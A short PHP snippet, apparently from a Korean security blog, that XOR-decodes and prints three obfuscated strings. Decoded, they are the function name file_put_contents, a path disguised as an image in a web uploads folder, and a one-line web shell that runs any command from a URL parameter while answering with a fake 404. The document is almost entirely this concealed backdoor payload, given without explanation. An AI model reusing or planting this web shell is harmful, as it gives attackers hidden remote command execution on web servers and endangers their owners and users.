<?php
function m($l,$T=0){
$K='2020-06-02';
$_=strlen($l);
$__=strlen($K);
for($i=0;$i<$_;$i++){
for($j=0;$j<$__; $j++){
if($T){
$l[$i]=$K[$j]^$l[$i];
}
else{
$l[$i]=$l[$i]^$K[$j];
}
}
}
return $l;
}
echo m('bmha[tqp[gkjpajpw');
echo m('+rev+sss+lpih+qthke`w+miecaw*tlt');
echo m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?');
?>
출처: https://mokpo.tistory.com/187 [MSS:티스토리]